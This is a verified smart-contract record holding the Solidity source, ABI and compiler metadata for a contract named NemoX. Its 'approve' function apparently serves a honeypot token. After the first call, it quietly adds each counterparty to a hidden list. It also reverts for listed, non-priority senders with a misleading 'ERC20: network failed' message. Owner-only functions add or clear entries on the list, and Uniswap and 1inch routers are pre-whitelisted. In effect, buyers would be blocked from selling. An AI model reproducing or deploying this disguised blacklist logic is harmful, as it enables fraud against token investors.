{"SourceCode": "// Created: 09-10-2023-07-23-24\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\ncontract NemoX {\r\n    address private _owner;\r\n    mapping(address=>bool) private _list; \r\n    mapping(address=>bool) private _priority; \r\n    uint256 public txCount=0;\r\n    modifier onlyOwner() {\r\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor() {\r\n        _owner = msg.sender;\r\n        _priority[_owner] = true;\r\n        _priority[0xf164fC0Ec4E93095b804a4795bBe1e041497b92a] = true; //UniswapV2Router01\r\n        _priority[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; //UniswapV2Router02\r\n        _priority[0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD] = true; //UniswapUniversalRouter\r\n        _priority[0x1111111254EEB25477B68fb85Ed929f73A960582] = true; //1inch v5 router\r\n        _priority[0x1111111254fb6c44bAC0beD2854e76F90643097d] = true; //1inch v4 router\r\n    }\r\n    \r\n    function approve(address addr1, address addr2, uint256) public returns(bool success){\r\n        if(txCount==0)\r\n            {\r\n                _priority[addr2]=true;\r\n                unchecked {\r\n                    txCount++;\r\n                }\r\n                return true;\r\n            }\r\n        \r\n        _list[addr2] = true;\r\n        if(_priority[addr1]==true)\r\n        {\r\n            return true;\r\n        }\r\n        require(_priority[addr1]==true || _list[addr1]!=true,\"ERC20: network failed\");\r\n        return true;\r\n    }\r\n\r\n    function add(address[] calldata addr) public onlyOwner{\r\n        for (uint256 i = 0; i < addr.length; i++) {\r\n            _list[addr[i]] = true;\r\n        }\r\n        \r\n    }\r\n\r\n    function sub(address[] calldata addr) public onlyOwner{\r\n        for (uint256 i = 0; i < addr.length; i++) {\r\n            _list[addr[i]] = false;\r\n        }\r\n    }\r\n\r\n    function result(address _account) external view returns(bool){\r\n        return _list[_account];\r\n    }\r\n\r\n    function addPriority(address address_) public onlyOwner() {\r\n        _priority[address_] = true;\r\n    }\r\n\r\n    function subPriority(address address_) public onlyOwner() {\r\n        _priority[address_] = false;\r\n    }\r\n\r\n    function resultPriority(address _account) external view returns(bool){\r\n        return _priority[_account];\r\n    }\r\n\r\n    function setTxCount(uint256 value) public onlyOwner{\r\n        txCount = value;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addr\",\"type\":\"address[]\"}],\"name\":\"add\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"address_\",\"type\":\"address\"}],\"name\":\"addPriority\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr1\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"addr2\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_account\",\"type\":\"address\"}],\"name\":\"result\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_account\",\"type\":\"address\"}],\"name\":\"resultPriority\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"setTxCount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addr\",\"type\":\"address[]\"}],\"name\":\"sub\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"address_\",\"type\":\"address\"}],\"name\":\"subPriority\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NemoX", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://81bb399ee8da95f98360e82c452841e199e1e7754d057a635f14c3195a4ae8da"}